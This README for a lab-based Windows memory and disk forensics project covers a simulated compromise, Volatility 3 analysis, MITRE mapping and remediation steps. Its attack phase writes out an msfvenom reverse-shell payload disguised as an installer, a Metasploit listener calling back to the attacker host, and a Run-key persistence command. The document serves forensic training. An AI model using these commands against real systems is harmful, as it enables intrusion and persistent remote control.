# 🔍 Digital Forensics & Incident Response (DFIR) — Windows Memory & Disk Forensics

## 📋 Overview
This project simulates a complete, end-to-end incident response investigation against a compromised Windows 10 endpoint. Unlike the previous projects in this portfolio (which focused on attacking or defending systems), this one operates entirely from the **responder's perspective**: given a compromised machine, reconstruct exactly what happened using only forensic artifacts — memory dumps, registry hives, and disk evidence — without access to the original attacker's tools or session.

The project covers both phases of a real DFIR engagement: simulating the initial compromise (to plant realistic artifacts), then switching roles to investigate, identify, and document the attack purely through forensic analysis.

## 🎯 Objective
To demonstrate the full Digital Forensics & Incident Response lifecycle — from initial compromise through forensic memory acquisition, process/network/registry analysis, and formal reporting — using industry-standard tools (Volatility 3, Magnet RAM Capture) and mapped to the **NIST SP 800-61 Incident Response Framework** and **MITRE ATT&CK**.

## 🖥️ Lab Environment

| Component | Details |
|-----------|---------|
| 🐉 Analyst / Attacker Machine | Kali Linux — 192.168.92.145 (VMware) |
| 🪟 Victim / Target Machine | Windows 10 x64 (Build 19045.3803) — 192.168.92.146 (VMware) |
| 🧲 Memory Acquisition Tool | Magnet RAM Capture v1.2.0 |
| 🔬 Memory Analysis Tool | Volatility 3 Framework v2.28.2 |
| ⚔️ Attack Framework | Metasploit Framework v6.5.3-dev |
| 🌐 Network | Isolated NAT network (no internet exposure) |

---

## 🔄 Methodology (NIST SP 800-61 Lifecycle)

### 🔴 Phase 1 — Attack Simulation (Preparation)
A reverse shell payload was generated using `msfvenom` and delivered to the Windows 10 
target, simulating a user executing a malicious file received via phishing or web download:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.92.145 LPORT=4444 \
-f exe -o update_installer.exe
```

A Metasploit multi/handler listener was configured on Kali to receive the reverse connection:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.92.145
set LPORT 4444
run
```

Once executed on the victim, a **Meterpreter session was successfully established**:
- 💻 **Target hostname:** DESKTOP-60IQ37R
- 🪟 **OS:** Windows 10 22H2 (Build 19045)
- ⚙️ **Architecture:** x64
- 👤 **Logged-on user:** DESKTOP-60IQ37R\Nour Abd El Wahed

---

### 🔴 Phase 2 — Persistence (Attacker Action)
A **Registry Run Key** was added manually to simulate real-world attacker persistence, 
ensuring the payload would re-execute on every user login:

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateInstaller" \
/t REG_SZ /d "C:\Users\Public\update_installer.exe" /f
```

✅ Result: `The operation completed successfully.`

> 🗺️ This technique maps to **MITRE ATT&CK T1547.001 — Boot or Logon Autostart Execution: 
> Registry Run Keys / Startup Folder**.

---

### 🔵 Phase 3 — Detection & Memory Acquisition (Responder Takes Over)
With the attack artifacts now planted, the role switches entirely to **incident responder**.

**Memory acquisition** was performed using Magnet RAM Capture v1.2.0 on the live Windows 
system while the malicious process was still running in memory:

- 📁 **Capture destination:** `C:\Users\Nour Abd El Wahed\Desktop\win10_memory.raw`
- 💾 **Total captured:** 9,216 MB (full physical RAM)
- ✅ **Status:** Successful

The memory image was transferred to the Kali analyst workstation for offline analysis.

---

### 🔵 Phase 4 — Memory Analysis with Volatility 3

#### 🧩 Process Analysis
```bash
vol -f /home/kali/forensics/win10_memory.raw windows.pslist.PsList
```
The process list revealed all running processes at the time of capture, providing a 
complete view of the system's execution state during the compromise.

#### 🌐 Network Connection Analysis
```bash
vol -f /home/kali/forensics/win10_memory.raw windows.netscan.NetScan
```
Network socket analysis revealed active and historical connections from the victim 
machine, including established connections and closed/timed-out sessions.

#### 🗝️ Registry Persistence Analysis
```bash
vol -f /home/kali/forensics/win10_memory.raw windows.registry.printkey.PrintKey \
--key "Software\Microsoft\Windows\CurrentVersion\Run"
```
The registry analysis confirmed the **UpdateInstaller** Run key was present in the 
victim's memory hive, pointing to `C:\Users\Public\update_installer.exe` — exactly 
matching the persistence mechanism planted during the attack simulation phase. This was 
discovered **purely from memory forensics**, without any prior knowledge of where or 
how persistence was established.

---

### 🔵 Phase 5 — Disk & Live Artifact Verification

**🗂️ Registry Editor (live cross-check):**
The `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` key was confirmed 
visually in Registry Editor, showing three entries:
- `MicrosoftEdgeA...` ✅ (legitimate)
- `OneDrive` ✅ (legitimate)
- **`UpdateInstaller`** ⚠️ → `C:\Users\Public\update_installer.exe` ← **malicious**

**📂 Prefetch Evidence:**
```cmd
dir C:\Windows\Prefetch\*UPDATE_INSTALLER*
```
Result: `UPDATE_INSTALLER.EXE-6AAE9832.pf` — confirming the executable had run on the 
system at `20/10/2026 07:11 AM`. Prefetch files are created by Windows for every 
executed binary and serve as **proof of execution** even if the binary is later deleted.

---

### 🗺️ Phase 6 — MITRE ATT&CK Mapping

| 🔍 Finding | 🗺️ MITRE ATT&CK Technique |
|------------|---------------------------|
| Malicious EXE downloaded and executed by user | T1204.002 — User Execution: Malicious File |
| Reverse shell payload delivered and executed | T1105 — Ingress Tool Transfer |
| Meterpreter C2 session established | T1071 — Application Layer Protocol |
| Registry Run Key persistence added | T1547.001 — Registry Run Keys / Startup Folder |
| Prefetch file confirms execution history | T1204 — User Execution (forensic artifact) |
| Memory analysis reveals live process tree | T1057 — Process Discovery |

---

### 🛡️ Phase 7 — Containment, Eradication & Recovery (NIST 800-61)

**🔒 Containment (recommended real-world action):**
Isolate the affected host from the network immediately upon detection to prevent lateral 
movement or data exfiltration.

**🧹 Eradication:**
- Delete `C:\Users\Public\update_installer.exe`
- Remove the `UpdateInstaller` Run registry key:
```cmd
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateInstaller" /f
```
- Terminate any active `update_installer.exe` processes

**♻️ Recovery:**
- Restore system from a known-clean snapshot (prior to compromise)
- Re-enable Windows Defender real-time protection
- Apply any pending Windows security updates

**💡 Lessons Learned:**
- 📧 Email filtering / web proxy would have blocked the initial payload delivery
- 🔐 Application allowlisting (AppLocker/WDAC) would have prevented execution of an 
  unsigned binary from a public user directory
- 🛡️ An EDR solution would have detected the Meterpreter connection and Run key creation 
  in real time, before a memory dump was even needed

---

## 💡 Key Takeaway
This project demonstrates something most student security portfolios don't include: the 
ability to **investigate an attack after the fact**, using only forensic evidence. Finding 
the `UpdateInstaller` persistence key in a memory dump — without any prior knowledge of 
how or where the attacker hid it — is the core skill of DFIR work, and it's what 
separates incident responders from pentesters. Every finding here was discovered through 
structured forensic methodology, not through knowledge of what was planted.

---

## 📸 Screenshots

| # | 🖼️ Screenshot | 📝 Description |
|---|--------------|----------------|
| 1 | `1__DFIR_Lab_Environment` | Kali and Windows 10 VMs running side by side |
| 2 | `2__Bidirectional_Network_Connectivity_Verification` | 0% packet loss both directions |
| 3 | `3__Meterpreter_Session_Established_on_Windows_Target` | Session open, sysinfo, getuid |
| 4 | `4__Registry_Run_Key_Persistence_Established` | Run key added via cmd.exe |
| 5 | `5__Memory_Capture_Completed` | Magnet RAM Capture — 9,216 MB captured |
| 6 | `6__Volatility_pslist` | Full process list from memory dump |
| 7 | `7__Volatility_3_Network_Connection_Analysis` | Network connections from memory |
| 8 | `8__Volatility_3_Registry_Persistence_Analysis` | UpdateInstaller key found in memory |
| 9 | `9__Registry_Persistence___Prefetch_Evidence` | Live registry + Prefetch execution proof |

---

## 📄 Incident Response Report
A formal DFIR report following the NIST SP 800-61 incident response lifecycle 
is included in this repository: [`DFIR_Incident_Response_Report.docx`](./DFIR_Incident_Response_Report.docx)

The report covers all phases of the investigation including executive summary, 
incident timeline, Volatility memory analysis findings, MITRE ATT&CK mapping, 
IOC index, and documented analysis limitations.
---

## 🛠️ Tools Used

| 🔧 Tool | 📌 Purpose |
|---------|-----------|
| 🐉 Kali Linux | Analyst & attack workstation |
| ⚔️ Metasploit Framework | Payload generation and delivery |
| 💣 msfvenom | Reverse shell payload creation |
| 🧲 Magnet RAM Capture v1.2.0 | Live memory acquisition |
| 🔬 Volatility 3 Framework v2.28.2 | Memory forensics analysis |
| 🗂️ Windows Registry Editor | Live artifact verification |
| 📂 Windows Prefetch | Proof of execution evidence |

---

## 📚 Frameworks Referenced
- 📘 **NIST SP 800-61** — Computer Security Incident Handling Guide (IR Lifecycle)
- 🗺️ **MITRE ATT&CK** — Adversarial Tactics, Techniques & Common Knowledge

---

## ⚠️ Disclaimer
This project was conducted entirely within an isolated, personal lab environment using 
virtual machines with no connection to external networks or real systems. The attack 
simulation was performed against a self-owned VM for educational and portfolio purposes 
only.
